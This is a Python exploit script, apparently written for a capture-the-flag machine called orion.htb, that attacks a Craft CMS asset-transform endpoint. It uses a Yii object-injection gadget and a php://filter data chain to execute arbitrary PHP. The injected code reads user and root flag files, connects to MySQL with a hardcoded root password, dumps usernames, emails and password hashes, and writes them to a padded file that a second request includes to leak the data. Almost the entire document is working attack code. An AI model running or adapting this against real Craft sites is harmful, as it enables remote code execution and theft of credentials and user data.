import requests, re, base64, time

HOST = 'http://orion.htb'

def inject_b64(php_code):
    b64 = base64.b64encode(php_code.encode()).decode()
    item_file = 'php://filter/read=convert.base64-decode/resource=data://text/plain;base64,' + b64
    s = requests.Session()
    s.get(f'{HOST}/index.php?p=admin/dashboard')
    r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
    m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
    tok = m.group(1) if m else ''
    body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":item_file}]}}}
    headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
    return s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=15)

# Step 1: Get DB data and write a big self-flushing PHP file
# The file structure: 15KB padding + DATA + 15KB padding + <?php error
php1 = (
    '<?php '
    '# Get the flag data '
    '$user_flag = @file_get_contents("/home/adam/user.txt"); '
    '$root_flag = @file_get_contents("/root/root.txt"); '
    '$uf = $user_flag !== false ? trim($user_flag) : "NO_USER_FLAG"; '
    '$rf = $root_flag !== false ? trim($root_flag) : "NO_ROOT_FLAG"; '
    '# Also get users from DB '
    'try { '
    '  $db = new PDO("mysql:host=127.0.0.1;dbname=orion", "root", "SuperSecureCraft123Pass!"); '
    '  $us = $db->query("SELECT id,username,email,password,admin FROM users")->fetchAll(PDO::FETCH_ASSOC); '
    '  $ud = json_encode($us); '
    '} catch (Exception $e) { $ud = "DBERR:" . $e->getMessage(); } '
    '# Build the self-flushing file '
    '# Format: text (will be output) + exfil data + text + <?php error '
    '$out = ""; '
    '$out .= str_repeat("PADDING\\n", 1200); '       # 1200 lines * 8 bytes = 9600 bytes of text
    '$out .= "===EXFIL_START===FLAGS===UF:$uf|RF:$rf===USERS:$ud===EXFIL_END===\\n"; '
    '$out .= str_repeat("PADDING\\n", 1600); '       # 1600 lines * 8 bytes = 12800 more bytes
    '$out .= "<?php echo UNDEFINED_CONSTANT_TO_TRIGGER_WARNING; ?>\\n"; '
    'file_put_contents("/dev/shm/big_flush.php", $out); '
)

print("[*] Step 1: Building big self-flushing file with flag data ...")
r = inject_b64(php1)
print(f"    Status: {r.status_code}")
time.sleep(2)

# Step 2: Include the big flush file
print("[*] Step 2: Including big_flush.php ...")
s = requests.Session()
s.get(f'{HOST}/index.php?p=admin/dashboard')
r2 = s.get(f'{HOST}/index.php?p=admin/dashboard')
m = re.search(r'csrfTokenValue":"([^"]+)"', r2.text)
tok = m.group(1) if m else ''
body = {"assetId":11,"handle":{"width":1,"height":1,"as session":{"class":"craft\\behaviors\\FieldLayoutBehavior","__class":"yii\\rbac\\PhpManager","__construct()":[{"itemFile":"/dev/shm/big_flush.php"}]}}}
headers = {'Content-Type':'application/json','X-CSRF-Token':tok}
r3 = s.post(f'{HOST}/index.php?p=admin/actions/assets/generate-transform', json=body, headers=headers, timeout=30)

print(f"    Status: {r3.status_code}, Len: {len(r3.text)}")
t = r3.text

for kw in ['EXFIL_START', 'FLAGS', 'UF:', 'RF:', 'USERS:', 'DBERR', 'PADDING']:
    if kw in t:
        idx = t.index(kw)
        print(f'[+] FOUND "{kw}" at byte {idx}')
        print(f'    Data: {t[idx:idx+400]}')
    else:
        print(f'[-] "{kw}" not found')

print(f'\n--- First 300 ---')
print(t[:300])
print(f'\n--- Last 600 ---')
print(t[-600:])
